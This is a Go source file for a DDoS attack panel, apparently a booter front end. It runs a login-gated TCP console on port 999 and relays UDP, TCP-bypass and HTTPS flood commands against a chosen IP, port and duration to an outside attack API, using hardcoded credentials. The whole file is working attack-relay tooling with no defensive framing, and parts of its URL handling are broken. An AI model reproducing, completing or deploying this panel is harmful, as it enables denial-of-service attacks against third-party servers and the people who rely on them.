package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"io/ioutil"
)

const (
	address   = "0.0.0.0:999"
	apiUrl    = "https://Lmksudmux/api/attack?key="
	usersFile = "users.txt"
)

func main() {
	ln, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Server listening on", address)

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		go handleRequest(conn)
	}
}

func handleRequest(conn net.Conn) {
	defer conn.Close()

	username := ""
	if !login(conn, &username) {
		conn.Write([]byte("Incorrect username or password. Connection terminated.\r\n"))
		return
	}

	title := fmt.Sprintf("\033]0;Welcome @%s to *udmux bypass* | Plan: default [1] con.\x07\r\n", username)
	conn.Write([]byte(title))

	printPrompt(conn, username)
	scanner := bufio.NewScanner(conn)

	for scanner.Scan() {
		input := scanner.Text()
		args := strings.Fields(input)
		if len(args) < 1 {
			conn.Write([]byte("Invalid command. Type ? for help.\r\n\r\n"))
			printPrompt(conn, username)
			continue
		}

		command := args[0]

		switch command {
		case "!udp", "!tcpbypass", "!https":
			if len(args) != 4 {
				conn.Write([]byte(fmt.Sprintf("Usage: %s <ip> <port> <time>\r\n\r\n", command)))
			} else {
				ip := args[1]
				port := args[2]
				time := args[3]
				triggerAttackMethod(command[1:], ip, port, time)
				conn.Write([]byte(fmt.Sprintf("Attack triggered: %s %s %s %s\r\n\r\n", command[1:], ip, port, time)))
			}
		case "!udmux":
			if len(args) != 2 {
				conn.Write([]byte("Usage: !udmux <username>\r\n\r\n"))
			} else {
				commandUsername := args[1]
				triggerAttack(commandUsername)
				conn.Write([]byte("Server Data Found | Command broadcasted all devices to @" + commandUsername + "\r\n\r\n"))
			}
		case "?":
			conn.Write([]byte("Available commands:\r\n"))
			conn.Write([]byte("!udp <ip> <port> <time> - Launch a UDP attack.\r\n"))
			conn.Write([]byte("!tcpbypass <ip> <port> <time> - Launch a TCP bypass attack.\r\n"))
			conn.Write([]byte("!https <ip> <port> <time> - Launch an HTTPS attack.\r\n"))
			conn.Write([]byte("!udmux <username> - Broadcast a UDMUX attack.\r\n\r\n"))
		default:
			conn.Write([]byte("Unknown command. Type ? for help.\r\n\r\n"))
		}
		printPrompt(conn, username)
	}
}

func triggerAttackMethod(method, ip, port, time string) {
	url := fmt.Sprintf("https://Lmkhosting/api/attack?username=lacsy&password=killed&target=%s&port=%s&time=%s&method=%s", ip, port, time, method)
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Error triggering %s attack: %v\n", method, err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response for %s attack: %v\n", method, err)
		return
	}
	fmt.Printf("API Response for %s: %s\n", method, string(body))
}

func triggerAttack(username string) {
	url := strings.Replace(apiUrl, "USERNAMEHERE", username, 1)
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error triggering attack:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}
	fmt.Println("API Response:", string(body))
}

func printPrompt(conn net.Conn, username string) {
	conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[31m@\033[0mudmux \033[31m>\033[0m ", username)))
}

func login(conn net.Conn, loggedInUsername *string) bool {
	conn.Write([]byte("Username: "))
	scanner := bufio.NewScanner(conn)
	scanner.Scan()
	username := scanner.Text()

	conn.Write([]byte("Password:\033[30m "))
	scanner.Scan()
	password := scanner.Text()

	conn.Write([]byte("\033[0m\n"))

	if validateCredentials(username, password) {
		*loggedInUsername = username
		return true
	}
	return false
}

func validateCredentials(username, password string) bool {
	file, err := os.Open(usersFile)
	if err != nil {
		fmt.Println("Error opening users file:", err)
		return false
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) == 2 && parts[0] == username && parts[1] == password {
			return true
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading users file:", err)
		return false
	}

	return false
}
